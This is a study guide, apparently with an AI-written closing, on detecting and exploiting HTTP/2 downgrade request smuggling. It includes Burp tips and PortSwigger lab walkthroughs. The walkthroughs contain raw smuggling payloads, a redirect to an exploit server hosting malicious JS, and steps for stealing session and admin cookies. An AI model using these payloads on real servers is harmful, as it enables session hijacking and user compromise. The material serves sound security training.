# <u>**HTTP Request Smuggling Notes**</u>

---

## Overview

- These notes explain how to detect and exploit HTTP/2 → HTTP/1.1 downgrading request smuggling attacks in clear, simple steps.
- Start with baseline checks to confirm whether HTTP/2 is negotiated and whether the front-end downgrades ambiguous length headers.
- Included: lab solutions (H2.CL, H2.TE, CRLF injection, and HTTP/1 TE obfuscation) plus extra probing techniques, Burp settings, and a one-page cheat-sheet.

---

## Quick checklist to confirm H2 downgrade candidates

1. Confirm HTTP/2 is in play
   - Check the Inspector's `Protocol` field in Burp (or your proxy). If the target never negotiates HTTP/2, stop here and test classic CL/TE and TE/CL smuggling on HTTP/1.1 only.

2. Baseline: send Content-Length (CL) + Transfer-Encoding (TE) together and compare HTTP/1.1 vs HTTP/2
   - Send the same request twice, toggling the protocol between HTTP/1.1 and HTTP/2 in the Inspector.
   - If HTTP/1.1 rejects the request (400) but HTTP/2 accepts it (200), you have a live HTTP/2 → HTTP/1.1 downgrade candidate.
   - If both protocols reject it cleanly, CL/TE probing is ineffective — skip to CRLF injection tests.

3. Test H2.CL (try this first — legal H/2 vector)
   - Send `Content-Length: 0` with a smuggled prefix in the body (POST over HTTP/2). Target a non-existent path so you can detect smuggling via 404 behavior.
   - If a subsequent request unexpectedly returns 404, the backend appended your prefix to that request: H2.CL confirmed.

4. Test H2.TE (use chunked)
   - If H2.CL shows nothing, add `Transfer-Encoding: chunked` (use the raw header editor if necessary) and drop `Content-Length`.
   - Send a chunked body (ending in `0`) with a smuggled prefix. Same 404-on-next-request check.

5. Test CRLF injection
   - If steps above fail, try injecting literal CRLFs inside a header value (in HTTP/2, edit header values via the Inspector and insert CRLF with Shift+Enter).
   - Use this to smuggle a `Transfer-Encoding` header or a full CRLF-terminated second request. Same 404-on-next-request check.

---

## Extra probing techniques (simple, copy/paste ready)

These are additional quick checks you can run when the baseline tests are inconclusive. Start low-noise and escalate.

1. Duplicate Content-Length headers
   - Send two `Content-Length` headers with different values and observe the backend response (e.g., `Content-Length: 10` and `Content-Length: 5`).
   - Some servers use the first value, some use the last; a mismatch can cause the backend to read a different amount of body than the front-end expects.

Example:

```
POST /nonexist HTTP/2
Host: target
Content-Length: 5
Content-Length: 0

SMUG
```

2. CL then TE vs TE then CL ordering
   - Test both orders (`CL` + `TE` and `TE` + `CL`) to see whether either side prefers one header over another.

3. Obfuscated/whitespace TE header
   - Insert spaces, tabs, or casing differences: `Transfer-Encoding : chunked`, `transfer-encoding: Chunked`, `Transfer-Encoding: chunked;`, or `Transfer-Encoding: chunked\t`.
   - Some parsers tolerate extra whitespace or header-case and will treat it differently from strict front-ends.

Example:

```
POST / HTTP/2
Host: target
Transfer-Encoding : chunked

0

SMUG
```

4. Multiple TE headers with different tokens
   - Send `Transfer-Encoding: cow` along with `Transfer-Encoding: chunked` to see if the front-end or backend prefers a specific token.

5. Large / partial body mismatch
   - Send a `Content-Length` larger than the actual body you transmit so the backend keeps waiting. This can help create desyncs on HTTP/1.1 backends.

6. Try smuggling with trailing CRLF variations
   - Vary the exact number of trailing CRLFs after the smuggled request (`\r\n`, `\r\n\r\n`, extra blank lines) — some servers are strict about termination.

7. Path-based detection using redirects
   - Use paths that the app redirects (e.g., `/resources` → `/resources/`) to cause the backend to issue redirects to the smuggled Host. This makes detection via logs simple.

8. Probe for response queue poisoning with easy markers
   - Smuggle a request that returns a recognizable 404 body (unique string). If you later get that unique body in another request, your prefix was processed.

---

## Burp settings & quick usage tips (no images — step-by-step)

- Inspector Protocol toggle: In Repeater (or the Intercept/Inspector), expand "Request attributes" and set `Protocol` to HTTP/2 before sending H2 tests; switch to HTTP/1.1 for H1-only tests.

- Raw header editor: Use Burp's raw header editor to add banned headers like `Transfer-Encoding` or to create weird header formatting (whitespace, casing).

- Entering CRLF in header values: Edit header values inline in the Inspector and press Shift+Enter to create a literal CRLF inside a header value (used for CRLF injection vectors in HTTP/2).

- Disable "Update Content-Length": In Repeater, uncheck "Update Content-Length" so Burp doesn't auto-correct lengths when you want to test inconsistent or malformed lengths.

- Repeat and time your attempts: Victim/admin activity is periodic. Automate repeating requests (or use a small script) and avoid flooding.

- Use non-existent endpoints (`/x`, `/nonexist`) for easy 404 detection when poisoning.

- Reset connection: If the backend connection becomes unsynchronized, send 5–10 ordinary non-smuggling requests to get a fresh connection.

---

## Labs (concise, step-by-step)

### Lab 1 — H2.CL (Content-Length: 0 smuggling)
1. Protocol: HTTP/2 in Inspector.
2. Repeater: POST / with `Content-Length: 0` and smuggled prefix; target a non-existent path.
3. If every second request returns 404, H2.CL confirmed.
4. Smuggle `GET /resources` with Host set to your exploit server; upload malicious JS to exploit server and wait for victim redirect.

Example:

```
POST / HTTP/2
Host: LAB.web-security-academy.net
Content-Length: 0

GET /resources HTTP/1.1
Host: EXPLOIT.exploit-server.net
Content-Length: 5

x=1
```


### Lab 2 — H2.TE (chunked response queue poisoning)
1. Protocol: HTTP/2.
2. Repeater: POST / with `Transfer-Encoding: chunked` and send `0` followed by smuggled prefix.
3. Send again; if you capture a 302 with an admin cookie, you can use it to access /admin and delete carlos.

Example:

```
POST /x HTTP/2
Host: LAB.web-security-academy.net
Transfer-Encoding: chunked

0

GET /x HTTP/1.1
Host: LAB.web-security-academy.net


```


### Lab 3 — CRLF injection (HTTP/2-only vector)
1. Protocol: HTTP/2.
2. Add header `foo: bar` and insert CRLF then `Transfer-Encoding: chunked` into the header value (Shift+Enter).
3. Body: `0` followed by smuggled POST that includes `Cookie: session=VICTIM`.
4. Wait for victim request and capture session cookie from reflected search history.


### Lab 4 — HTTP/1 TE obfuscation (GPOST)
1. Switch to HTTP/1.1. Disable "Update Content-Length" in Repeater.
2. Send the provided obfuscated chunked request twice.
3. The second response should show `Unrecognized method GPOST` which confirms the backend saw the smuggled method.

Example:

```
POST / HTTP/1.1
Host: LAB.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked
Transfer-encoding: cow

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

```

---

## One-page Cheat Sheet (copy/paste)

- Confirm HTTP/2: Inspector -> Protocol = HTTP/2
- Baseline: send CL+TE on H1 vs H2. H1 rejects, H2 accepts = downgrade candidate.
- H2.CL: POST with `Content-Length: 0` + smuggled GET/POST in body → check 404-on-next-request.
- H2.TE: POST with `Transfer-Encoding: chunked` + `0` then smuggled prefix → check 404/302 capture.
- CRLF injection: insert `\r\n` in a header value (Shift+Enter) to smuggle `Transfer-Encoding` or full request.
- Probes: duplicate CLs, obfuscated/whitespace headers, multiple TE tokens, partial bodies, varied CRLF termination.
- Burp tips: disable Update Content-Length, use raw header editor, toggle Protocol in Inspector, Shift+Enter for CRLF.



## Final notes

I updated wording for clarity, added more probing techniques that are simple to understand, included Burp settings and a handy cheat-sheet. If you want screenshots or sample Burp project files I can add instructions and placeholders; I can't create real screenshots here but I can produce step-by-step image descriptions or a script to export Burp items.

Tell me if you want the README link now or screenshots or a condensed printable PDF-style markdown and I will add it next.
